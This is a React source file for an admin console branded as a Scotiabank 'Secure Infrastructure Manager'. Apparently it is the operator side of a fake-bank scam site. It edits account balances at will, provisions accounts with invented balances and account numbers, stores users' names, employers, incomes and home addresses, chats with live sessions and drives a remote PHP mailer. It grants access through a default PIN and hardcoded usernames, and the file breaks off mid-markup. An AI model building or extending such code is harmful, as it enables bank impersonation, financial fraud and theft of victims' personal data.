import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Users, Settings, Shield, Terminal, Zap, Database, Server,
  Search, Plus, Edit2, Trash2, Check, X, ChevronRight, 
  Activity, Info, AlertTriangle, Key, Send, Mail, MessageSquare,
  Lock, RefreshCw, Eye, EyeOff, BarChart3, Globe, Save
} from 'lucide-react';
import { useBank } from '../shared/BankContext';
import { useSocket } from '../shared/SocketContext';
import { SupportChat } from './SupportChat';
import { Mailer } from './Mailer';

type Tab = 'live' | 'database' | 'support' | 'debug' | 'mailer' | 'system' | 'settings' | 'backup';

interface AdminUser {
  id: string;
  username: string;
  enabled: boolean;
  isLocked?: boolean;
  isApproved?: boolean;
  created_at: string;
  settings: any;
  accounts: any;
  autoDeleteAt?: string;
}

export function AdminPanel() {
  const { toggleAdminPanel, globalSettings, fetchGlobalSettings, user } = useBank();
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [pin, setPin] = useState('');
  const [activeTab, setActiveTab] = useState<Tab>('live');
  const [users, setUsers] = useState<AdminUser[]>([]);
  const [loading, setLoading] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [editingUser, setEditingUser] = useState<AdminUser | null>(null);
  const [logs, setLogs] = useState<any[]>([]);
  const [debugLogs, setDebugLogs] = useState<any[]>([]);
  const [config, setConfig] = useState<any>(null);
  const [saving, setSaving] = useState(false);
  const [testEmail, setTestEmail] = useState('');
  const [mailerStatus, setMailerStatus] = useState<any>(null);
  const [showAddUser, setShowAddUser] = useState(false);
  const [newUserForm, setNewUserForm] = useState({ username: '', password: '', initialBalance: 0 });
  const [selectedUserChat, setSelectedUserChat] = useState<string | null>(null);
  const [sessions, setSessions] = useState<any[]>([]);
  const { socket } = useSocket();

  // Auth check
  const handleAuth = () => {
    if (pin === (globalSettings?.general?.adminPin || '1234')) {
      setIsAuthenticated(true);
    } else {
      alert('ACCESS DENIED: SYSTEM LOCKDOWN INITIATED');
      setPin('');
    }
  };

  useEffect(() => {
    if (socket && isAuthenticated) {
      const handleUpdate = (data: any) => {
        if (data.sessions) setSessions(data.sessions);
        if (data.logs) setLogs(data.logs);
      };
      socket.on('admin_update', handleUpdate);
      return () => { socket.off('admin_update', handleUpdate); };
    }
  }, [socket, isAuthenticated]);

  useEffect(() => {
    // If the user already logged in as 'admin' or has a valid pin in their session profile
    if (user?.username === 'admin' || user?.username === 'PROJECTSARAH') {
      setIsAuthenticated(true);
    }
  }, [user]);

  useEffect(() => {
    if (isAuthenticated) {
      fetchUsers();
      fetchLogs();
      fetchDebugLogs();
      fetchConfig();
      fetchMailerStatus();
      
      const interval = setInterval(() => {
        fetchLogs();
        fetchDebugLogs();
        fetchMailerStatus();
      }, 3000);
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const fetchUsers = async () => {
    try {
      const res = await fetch('/api/admin/users');
      if (res.ok) {
        const data = await res.json();
        setUsers(data.users || []);
      }
    } catch (e) {
      console.error('Failed to fetch users:', e);
    }
  };

  const fetchLogs = async () => {
    try {
      const res = await fetch('/api/logs');
      if (res.ok) {
        const data = await res.json();
        setLogs(data);
      }
    } catch (e) {
      console.error('Failed to fetch logs:', e);
    }
  };

  const fetchDebugLogs = async () => {
    try {
      const res = await fetch('/api/admin/debug-logs');
      if (res.ok) {
        const data = await res.json();
        setDebugLogs(data);
      }
    } catch (e) {
      console.error('Failed to fetch debug logs:', e);
    }
  };

  const fetchConfig = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/config');
      if (res.ok) {
        const data = await res.json();
        setConfig(data);
      }
    } finally {
      setLoading(false);
    }
  };

  const fetchMailerStatus = async () => {
    try {
      const res = await fetch('/api/debug/smtp');
      if (res.ok) {
        setMailerStatus(await res.json());
      }
    } catch (e) {}
  };

  const handleSaveConfig = async (newConfig: any) => {
    setSaving(true);
    try {
      const copyConfig = JSON.parse(JSON.stringify(newConfig));
      const currentUrl = copyConfig.general?.baseActionUrl;
      if (currentUrl) {
          let recentUrls = copyConfig.general?.recentActionUrls || [];
          recentUrls = [currentUrl, ...recentUrls.filter((u: string) => u !== currentUrl)].slice(0, 3);
          copyConfig.general.recentActionUrls = recentUrls;
          setConfig(copyConfig);
      }

      const res = await fetch('/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(copyConfig)
      });
      if (res.ok) {
        fetchGlobalSettings();
        fetchConfig();
      }
    } finally {
      setSaving(false);
    }
  };

  const handleUpdateBalance = async (username: string, accountName: string, balance: number) => {
    try {
      await fetch('/api/admin/users/update-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, account: accountName, balance })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const approveUser = async (username: string) => {
    try {
      await fetch('/api/admin/users/approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const toggleUserEnabled = async (username: string) => {
    try {
      await fetch('/api/admin/users/toggle-enabled', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const lockUser = async (username: string, locked: boolean) => {
    try {
      await fetch('/api/admin/users/lock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, locked })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const createUser = async () => {
    if (!newUserForm.username || !newUserForm.password) return;
    try {
      const defaultAccounts: any = {
        'Ultimate Package': { type: 'banking', balance: newUserForm.initialBalance, available: newUserForm.initialBalance, points: 0, history: [], accountNumber: `10000-${Math.floor(Math.random() * 900) + 100}-${Math.floor(Math.random() * 9000000) + 1000000}` },
      };
      
      await fetch('/api/user/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: newUserForm.username, 
          password: newUserForm.password,
          isNew: true,
          data: {
            username: newUserForm.username,
            isApproved: true, // Manually created users are auto-approved
            accounts: defaultAccounts,
            settings: {
              accountHolderName: newUserForm.username,
              memberSince: new Date().getFullYear().toString()
            }
          }
        })
      });
      setShowAddUser(false);
      setNewUserForm({ username: '', password: '', initialBalance: 0 });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const deleteUser = async (username: string) => {
    if (!confirm(`Delete ${username}?`)) return;
    try {
      await fetch('/api/user/delete', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  const handleUpdateUserSettings = async (username: string, updates: any) => {
    try {
      await fetch('/api/admin/users/update-settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, updates })
      });
      fetchUsers();
    } catch (e) {
      console.error(e);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-6">
        <motion.div 
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="w-full max-w-sm"
        >
          <div className="bg-zinc-900 border border-white/5 rounded-3xl p-8 text-center space-y-6">
            <div className="flex justify-center">
              <div className="w-16 h-16 bg-red-600 rounded-2xl flex items-center justify-center shadow-lg shadow-red-600/20">
                <Shield className="text-white" size={32} />
              </div>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Admin Secure Portal</h2>
              <p className="text-zinc-500 text-sm mt-1">Enter PIN to authorize session</p>
            </div>
            
            <div className="flex justify-center gap-3">
              {[0, 1, 2, 3].map((i) => (
                <div key={i} className={`w-3 h-3 rounded-full ${pin.length > i ? 'bg-red-600 shadow-[0_0_8px_rgba(237,7,17,0.5)]' : 'bg-zinc-800'}`} />
              ))}
            </div>

            <div className="grid grid-cols-3 gap-4">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9, 'C', 0, 'OK'].map((num) => (
                <button
                  key={num.toString()}
                  onClick={() => {
                    if (num === 'C') setPin('');
                    else if (num === 'OK') handleAuth();
                    else if (pin.length < 4) setPin(prev => prev + num);
                  }}
                  className="h-14 bg-zinc-800 hover:bg-zinc-700 active:scale-95 transition-all rounded-xl text-white font-bold text-lg"
                >
                  {num}
                </button>
              ))}
            </div>
            
            <div className="pt-4">
              <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-[0.2em]">Authorized Access Only</p>
            </div>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[2000] bg-[#0A0A0A] flex flex-col font-sans overflow-hidden select-none">
      {/* Professional Header */}
      <div className="bg-[#1A1A1A] border-b border-white/5 p-4 flex items-center justify-between relative z-20 shadow-xl">
        <div className="flex items-center gap-4">
          <div className="w-8 h-8 bg-red-600 rounded flex items-center justify-center shadow-lg">
            <Shield size={18} className="text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xs font-bold text-white uppercase tracking-wider">Operational Support Portal</h1>
              <span className="text-[10px] bg-red-600/10 text-red-500 px-2 py-0.5 rounded border border-red-500/20 font-bold uppercase">Restricted</span>
            </div>
            <p className="text-[10px] text-zinc-500 font-medium">Scotiabank Secure Infrastructure Manager</p>
          </div>
        </div>
        <div className="flex items-center gap-6">
           <div className="hidden md:flex flex-col items-end">
              <span className="text-[9px] text-zinc-500 uppercase tracking-tighter">Server Status</span>
              <div className="flex items-center gap-1.5">
                <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" />
                <span className="text-[10px] text-emerald-500 font-bold uppercase">Live & Encrypted</span>
              </div>
           </div>
           {/* Exit button removed per request: "YOU CANT EXIT IT" */}
        </div>
      </div>

      {/* Navigation */}
      <div className="flex bg-[#1A1A1A] border-b border-white/5 relative z-20">
        {[
          { id: 'live', icon: <Activity size={14} />, label: 'Audit Log' },
          { id: 'database', icon: <Users size={14} />, label: 'Accounts' },
          { id: 'support', icon: <MessageSquare size={14} />, label: 'Support Desk' },
          { id: 'debug', icon: <Terminal size={14} />, label: 'Diagnostics' },
          { id: 'mailer', icon: <Mail size={14} />, label: 'Mailer' },
          { id: 'backup', icon: <Database size={14} />, label: 'Backup' },
          { id: 'settings', icon: <Settings size={14} />, label: 'System Config' }
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`flex-1 flex flex-col items-center py-4 transition-all relative ${
              activeTab === tab.id ? 'text-white' : 'text-zinc-500 hover:text-zinc-300'
            }`}
          >
            <div className={`mb-1.5 transition-transform ${activeTab === tab.id ? 'scale-110' : ''}`}>
              {tab.icon}
            </div>
            <span className="text-[9px] font-bold tracking-widest uppercase">{tab.label}</span>
            {activeTab === tab.id && (
              <motion.div 
                layoutId="activeTabC2"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-red-600" 
              />
            )}
          </button>
        ))}
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto bg-[#050505] p-4 space-y-6 pb-24 relative z-20 scrollbar-hide">
        {activeTab === 'live' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="grid grid-cols-2 gap-3">
              <div className="bg-zinc-900/50 rounded-2xl p-4 border border-white/5">
                <p className="text-[10px] text-zinc-500 uppercase font-black tracking-widest">Active Users</p>
                <p className="text-2xl font-bold text-white mt-1">{users.length}</p>
              </div>
              <div className="bg-zinc-900/50 rounded-2xl p-4 border border-white/5">
                <p className="text-[10px] text-zinc-500 uppercase font-black tracking-widest">System Load</p>
                <p className="text-2xl font-bold text-emerald-500 mt-1">Stable</p>
              </div>
            </div>

            <div className="bg-zinc-900/50 rounded-2xl border border-white/5 overflow-hidden">
              <div className="p-3 border-b border-white/5 bg-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Terminal size={14} className="text-red-500" />
                  <span className="text-[10px] font-bold text-white uppercase">Live Event Stream</span>
                </div>
                <span className="text-[8px] bg-red-500/10 text-red-500 px-1.5 py-0.5 rounded font-mono">DEBUG_MODE</span>
              </div>
            <div className="h-96 overflow-y-auto p-4 space-y-2 font-mono text-[10px]">
                {logs.length === 0 && <p className="text-zinc-600 italic">Listening for system events...</p>}
                {logs.map((log, i) => (
                  <div key={i} className="flex gap-3 text-zinc-400 border-b border-white/5 pb-1 last:border-0 group">
                    <span className="text-red-500 shrink-0 opacity-50 group-hover:opacity-100 transition-opacity">[{log.timestamp || '09:02'}]</span>
                    <span className="flex-1 group-hover:text-emerald-400 transition-colors">{log.message}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'database' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="flex justify-between items-center px-1">
              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-[0.2em]">Account Management</h3>
              <button 
                onClick={() => setShowAddUser(true)}
                className="flex items-center gap-2 bg-red-600 shadow-[0_0_15px_rgba(237,7,17,0.2)] text-white px-3 py-1.5 rounded-lg text-[10px] font-black uppercase tracking-widest transition-all"
              >
                <Plus size={12} /> Provision Account
              </button>
            </div>

            <AnimatePresence>
              {showAddUser && (
                <motion.div 
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  exit={{ opacity: 0, height: 0 }}
                  className="bg-zinc-900 border border-emerald-500/30 rounded-2xl overflow-hidden p-4 space-y-4 shadow-[0_0_20px_rgba(16,185,129,0.1)]"
                >
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-1">
                      <label className="text-[9px] text-zinc-500 uppercase font-bold">Username</label>
                      <input 
                        type="text" 
                        value={newUserForm.username}
                        onChange={(e) => setNewUserForm({...newUserForm, username: e.target.value})}
                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-zinc-500 uppercase font-bold">Password</label>
                      <input 
                        type="password" 
                        value={newUserForm.password}
                        onChange={(e) => setNewUserForm({...newUserForm, password: e.target.value})}
                        className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                      />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <label className="text-[9px] text-zinc-500 uppercase font-bold">Initial Balance</label>
                    <input 
                      type="number" 
                      value={newUserForm.initialBalance}
                      onChange={(e) => setNewUserForm({...newUserForm, initialBalance: parseFloat(e.target.value)})}
                      className="w-full bg-black border border-white/10 rounded-xl px-3 py-2 text-white text-xs focus:border-emerald-500/50 outline-none"
                    />
                  </div>
                  <div className="flex gap-2">
                    <button 
                      onClick={() => setShowAddUser(false)}
                      className="flex-1 py-2 text-zinc-500 text-[10px] font-bold uppercase tracking-widest"
                    >
                      Cancel
                    </button>
                    <button 
                      onClick={createUser}
                      className="flex-1 bg-emerald-600 text-black py-2 rounded-xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-emerald-500/20"
                    >
                      Confirm Injection
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Pending Approvals Section */}
            {users.some(u => u.isApproved === false) && (
              <div className="space-y-3">
                <h3 className="text-[10px] text-amber-500 font-black uppercase tracking-[0.2em] px-1 flex items-center gap-2">
                  <AlertTriangle size={12} /> Pending Approvals
                </h3>
                {users.filter(u => u.isApproved === false).map(u => (
                  <div key={u.id} className="bg-amber-500/5 border border-amber-500/20 rounded-2xl overflow-hidden p-4 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
                        <Users className="text-amber-500" size={20} />
                      </div>
                      <div>
                        <p className="text-sm font-bold text-white">{u.username}</p>
                        <p className="text-[10px] text-amber-500/60 uppercase">System Enrollment Request</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => approveUser(u.username)}
                      className="bg-amber-500 hover:bg-amber-400 text-black px-4 py-2 rounded-xl text-xs font-black uppercase tracking-widest transition-all active:scale-95"
                    >
                      Approve
                    </button>
                  </div>
                ))}
              </div>
            )}

            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-500" size={16} />
              <input 
                type="text" 
                placeholder="Search database by username or email..." 
                className="w-full bg-zinc-900 border border-white/5 rounded-xl py-3 pl-10 pr-4 text-sm text-white focus:outline-none focus:border-red-500/50 transition-colors"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            <div className="space-y-3">
              {users.filter(u => u.username?.includes(searchTerm)).map(u => (
                <div key={u.id} className="bg-zinc-900 border border-white/5 rounded-2xl overflow-hidden active:scale-[0.98] transition-transform">
                  <div className="p-4 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-2 h-2 rounded-full ${u.enabled ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.5)]' : 'bg-red-500'}`} />
                      <div>
                        <p className="text-sm font-bold text-white">{u.username}</p>
                        <p className="text-[10px] text-zinc-500">ID: {u.id.substring(0, 8)}... // Ref: SARAH-{u.username.substring(0,3).toUpperCase()}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <button 
                        onClick={() => lockUser(u.username, !u.isLocked)}
                        className={`p-2 rounded-lg transition-all ${u.isLocked ? 'bg-red-600/20 text-red-500 border border-red-500/30' : 'bg-white/5 text-zinc-500 hover:text-red-500'}`}
                        title={u.isLocked ? "Unlock Account" : "Lock for Fraud"}
                      >
                        <Lock size={16} />
                      </button>
                      <button 
                        onClick={() => toggleUserEnabled(u.username)}
                        className={`p-2 rounded-lg ${u.enabled ? 'bg-white/5 text-zinc-400' : 'bg-red-600/20 text-red-500'}`}
                      >
                        {u.enabled ? <Eye size={16} /> : <EyeOff size={16} />}
                      </button>
                      <button 
                        onClick={() => setEditingUser(editingUser?.id === u.id ? null : u)}
                        className={`p-2 rounded-lg ${u.isApproved === false ? 'bg-amber-600/20 text-amber-500' : 'bg-white/5 text-zinc-400'}`}
                      >
                        <ChevronRight size={16} className={`transition-transform ${editingUser?.id === u.id ? 'rotate-90' : ''}`} />
                      </button>
                    </div>
                  </div>

                  <AnimatePresence>
                    {editingUser?.id === u.id && (
                      <motion.div 
                        initial={{ height: 0 }}
                        animate={{ height: 'auto' }}
                        exit={{ height: 0 }}
                        className="overflow-hidden bg-black/30 border-t border-white/5"
                      >
                        <div className="p-4 space-y-4">
                          {/* Accounts Balance Editor */}
                          <div className="space-y-2">
                            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Financial Records</p>
                            <div className="grid grid-cols-1 gap-2">
                              {Object.entries(u.accounts || {}).map(([name, data]: [string, any]) => (
                                <div key={name} className="flex items-center justify-between bg-zinc-900/50 p-2 rounded-xl border border-white/5 text-xs">
                                  <span className="text-zinc-400">{name}</span>
                                  <input 
                                    type="number"
                                    className="bg-black border border-white/5 rounded px-2 py-1 w-24 text-right text-emerald-500 font-bold"
                                    defaultValue={data.balance}
                                    onBlur={(e) => handleUpdateBalance(u.username, name, parseFloat(e.target.value) || 0)}
                                  />
                                </div>
                              ))}
                            </div>
                          </div>                           {/* Quick Actions & Settings */}
                          <div className="space-y-4 pt-4 border-t border-white/5">
                            <div className="space-y-3">
                              <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Registration Vault</p>
                              <div className="grid grid-cols-2 gap-3">
                                <div className="space-y-1">
                                  <label className="text-[9px] text-zinc-500">Legal Name (Sender)</label>
                                  <input 
                                    type="text" 
                                    defaultValue={u.settings?.accountHolderName || u.username}
                                    onBlur={(e) => handleUpdateUserSettings(u.username, { ...u.settings, accountHolderName: e.target.value })}
                                    className="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-white text-[10px] focus:border-red-500 outline-none"
                                  />
                                </div>
                                <div className="space-y-1">
                                  <label className="text-[9px] text-zinc-500">Workplace</label>
                                  <input 
                                    type="text" 
                                    defaultValue={u.settings?.employerName || ''}
                                    onBlur={(e) => handleUpdateUserSettings(u.username, { ...u.settings, employerName: e.target.value })}
                                    className="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-white text-[10px] focus:border-red-500 outline-none"
                                  />
                                </div>
                              </div>
                              <div className="grid grid-cols-2 gap-3">
                                <div className="space-y-1">
                                  <label className="text-[9px] text-zinc-500">Annual Income ($)</label>
                                  <input 
                                    type="number" 
                                    defaultValue={u.settings?.annualIncome || 0}
                                    onBlur={(e) => handleUpdateUserSettings(u.username, { ...u.settings, annualIncome: parseFloat(e.target.value) || 0 })}
                                    className="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-white text-[10px] focus:border-red-500 outline-none"
                                  />
                                </div>
                                <div className="space-y-1">
                                  <label className="text-[9px] text-zinc-500">Home Address</label>
                                  <input 
                                    type="text" 
                                    defaultValue={u.settings?.address || ''}
                                    onBlur={(e) => handleUpdateUserSettings(u.username, { ...u.settings, address: e.target.value })}
                                    className="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-white text-[10px] focus:border-red-500 outline-none"
                                  />
                                </div>
                              </div>
                            </div>

                            <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest pl-1">Thresholds & Limits</p>
                            <div className="grid grid-cols-2 gap-3">
                              <div className="space-y-1">
                                <label className="text-[9px] text-zinc-500">Tx Limit ($)</label>
                                <input 
                                  type="number" 
                                  defaultValue={u.settings?.transferLimit || 3000}
                                  onBlur={(e) => handleUpdateUserSettings(u.username, { ...u.settings, transferLimit: parseInt(e.target.value) || 3000 })}
                                  className="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-white text-[10px] focus:border-red-500 outline-none"
                                />
                              </div>
                              <div className="space-y-1">
                                <label className="text-[9px] text-zinc-500">Daily Max ($)</label>
                                <input 
                                  type="number" 
                                  defaultValue={u.settings?.dailyLimit || 3000}
                                  onBlur={(e) => handleUpdateUserSettings(u.username, { ...u.settings, dailyLimit: parseInt(e.target.value) || 3000 })}
                                  className="w-full bg-black/50 border border-white/10 rounded-lg px-3 py-2 text-white text-[10px] focus:border-red-500 outline-none"
                                />
                              </div>
                            </div>

                            <div className="flex gap-2">
                              <button 
                                onClick={() => deleteUser(u.username)}
                                className="flex-1 bg-red-600/10 hover:bg-red-600/20 text-red-500 py-3 rounded-xl text-xs font-bold transition-colors flex items-center justify-center gap-2"
                              >
                                <Trash2 size={14} /> PURGE ENTITY
                              </button>
                            </div>
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'support' && (
          <div className="h-full flex flex-col lg:flex-row gap-4 animate-in fade-in slide-in-from-bottom-2 overflow-hidden">
            {/* User List Sidebar */}
            <div className="w-full lg:w-80 flex flex-col gap-3 h-full">
              <div className="flex items-center justify-between px-1">
                <h3 className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Subscriber Directory</h3>
              </div>
              <div className="relative">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-600" size={14} />
                <input 
                  type="text" 
                  placeholder="Filter users..."
                  className="w-full bg-[#1A1A1A] border border-white/5 rounded-lg py-2 pl-9 pr-4 text-xs text-white focus:outline-none focus:border-red-500/50"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
              <div className="flex-1 overflow-y-auto space-y-1 bg-[#1A1A1A] rounded-xl border border-white/5 p-2 scrollbar-hide">
                {users.filter(u => u.username.toLowerCase().includes(searchTerm.toLowerCase())).map(u => {
                  const activeSession = sessions.find(s => s.username === u.username);
                  const isActive = !!activeSession;
                  const isSelected = selectedUserChat === (isActive ? activeSession.id : u.username);
                  
                  return (
                    <button
                      key={u.username}
                      onClick={() => setSelectedUserChat(isActive ? activeSession.id : u.username)}
                      className={`w-full flex items-center justify-between p-3 rounded-lg transition-all ${
                        isSelected ? 'bg-red-600 text-white shadow-lg' : 'hover:bg-white/5 text-zinc-400'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <div className="relative">
                          <div className={`w-8 h-8 rounded-lg flex items-center justify-center text-[10px] font-bold ${
                            isSelected ? 'bg-white/20' : 'bg-[#0A0A0A] text-zinc-500'
                          }`}>
                            {u.username[0].toUpperCase()}
                          </div>
                          {isActive && (
                            <div className="absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 bg-emerald-500 rounded-full border-2 border-[#1A1A1A]" />
                          )}
                        </div>
                        <div className="text-left overflow-hidden">
                          <p className="text-[11px] font-bold truncate max-w-[120px]">{u.username}</p>
                          <p className={`text-[9px] ${isSelected ? 'text-white/60' : 'text-zinc-600'}`}>
                            {isActive ? 'Active Session' : 'Offline'}
                          </p>
                        </div>
                      </div>
                      <ChevronRight size={14} className={isSelected ? 'text-white' : 'text-zinc-800'} />
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Chat Window */}
            <div className="flex-1 bg-[#1A1A1A] rounded-2xl border border-white/5 flex flex-col min-h-[500px]">
              {selectedUserChat ? (
                <SupportChat 
                  isAdmin 
                  targetSocketId={sessions.find(s => s.id === selectedUserChat) ? selectedUserChat : undefined}
                  targetUsername={sessions.find(s => s.id === selectedUserChat)?.username || selectedUserChat}
                  isOpen 
                />
              ) : (
                <div className="flex-1 flex flex-col items-center justify-center text-center p-8 opacity-30">
                  <div className="w-16 h-16 bg-white/5 rounded-full flex items-center justify-center mb-4">
                    <MessageSquare size={32} className="text-zinc-500" />
                  </div>
                  <h4 className="text-white text-sm font-bold uppercase tracking-widest">Link Awaiting</h4>
                  <p className="text-zinc-600 text-[10px] uppercase font-bold mt-1">Select a terminal to establish an uplink.</p>
                </div>
              )}
            </div>
          </div>
        )}

        {activeTab === 'debug' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="flex items-center justify-between">
              <h3 className="text-[10px] text-zinc-500 font-black uppercase tracking-widest">Failure Diagnostics</h3>
              <button 
                onClick={() => fetchDebugLogs()}
                className="text-[8px] text-zinc-400 hover:text-white flex items-center gap-1 group"
              >
                <RefreshCw size={10} className="group-active:rotate-180 transition-transform" /> FORCE RELOAD
              </button>
            </div>

            <div className="bg-zinc-900/80 border border-white/5 rounded-2xl overflow-hidden font-mono text-[10px]">
              <div className="p-3 bg-red-600/5 flex items-center justify-between border-b border-white/5">
                <span className="text-red-500 font-bold">CRITICAL SYSTEM FAILURES</span>
                <span className="text-zinc-600">LIMIT: 100</span>
              </div>
              <div className="max-h-[60vh] overflow-y-auto p-4 space-y-3">
                {debugLogs.length === 0 && <p className="text-zinc-700 italic">No failures detected in current cycle.</p>}
                {debugLogs.map((log, i) => (
                  <div key={i} className="border-l-2 border-red-600/50 bg-red-600/5 p-3 space-y-1 group hover:border-red-600 transition-colors">
                    <div className="flex justify-between items-center opacity-60 text-[8px]">
                      <span>{log.dateString}</span>
                      <span className="bg-red-600/20 px-1 border border-red-600/20">{log.type}</span>
                    </div>
                    <p className="text-zinc-200 font-bold">{log.message}</p>
                    <div className="mt-2 text-zinc-500 bg-black/40 p-2 rounded border border-white/5 overflow-x-auto">
                      <pre className="text-[9px]">{JSON.stringify(log.context, null, 2)}</pre>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'mailer' && (
          <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2">
            <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6">
                <button
                    onClick={async () => {
                        const url = config?.general?.baseActionUrl;
                        if (!url) {
                            alert('No baseActionUrl configured!');
                            return;
                        }
                        try {
                            // Using a simple fetch - the remote PHP might not support GET here, 
                            // but if it's reachable it should error differently than a connection fail
                            const res = await fetch(`${url}/api/mailer.php`, { method: 'POST' });
                            alert(`Connection test result: ${res.status === 200 ? 'OK' : 'Received status ' + res.status}`);
                        } catch (e) {
                            alert(`Connection test error: ${e}`);
                        }
                    }}
                    className="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded-xl text-xs font-black uppercase tracking-widest transition-all"
                >
                    Test Handshake
                </button>
            </div>
            
            {/* Mailer Status Diagnostics */}
            {mailerStatus && (
              <div className="bg-zinc-900 border border-white/5 rounded-2xl p-6">
                <h4 className="text-[10px] text-zinc-500 font-black uppercase tracking-widest mb-4">SMTP Health Status</h4>
                <div className="grid grid-cols-2 gap-4">
                  <div className="bg-black/50 p-4 rounded-xl border border-white/5">
                    <p className="text-[9px] text-zinc-500 uppercase">Status</p>
                    <p className={`text-sm font-bold ${mailerStatus.online ? 'text-emerald-500' : 'text-red-500'}`}>
                      {mailerStatus.online ? 'ONLINE' : 'OFFLINE'}
                    </p>
                  </div>
                  <div className="bg-black/50 p-4 rounded-xl border border-white/5">
                    <p className="text-[9px] text-zinc-500 uppercase">Last Log</p>
                    <p className="text-xs text-white truncate">{mailerStatus.lastLog || 'No activity'}</p>
                  </div>
                </div>
              </div>
            )}
                <div className="space-y-2">
                  <label className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Test Recipient</label>
                  <div className="flex gap-2">
                    <input 
                      type="email" 
                      placeholder="admin@example.com" 
                      className="flex-1 bg-black border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500/50"
                      value={testEmail}
                      onChange={(e) => setTestEmail(e.target.value)}
                    />
                    <button 
                      onClick={() => alert('Sending test email...')}
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 rounded-xl text-xs font-bold transition-colors"
                    >
                      SEND
                    </button>
                  </div>
                </div>

                <div className="p-4 bg-black/50 rounded-2xl border border-white/5 space-y-3">
                  <div className="flex items-center justify-between pb-2 border-b border-white/5">
                    <span className="text-[10px] text-white font-bold">SMTP STATUS</span>
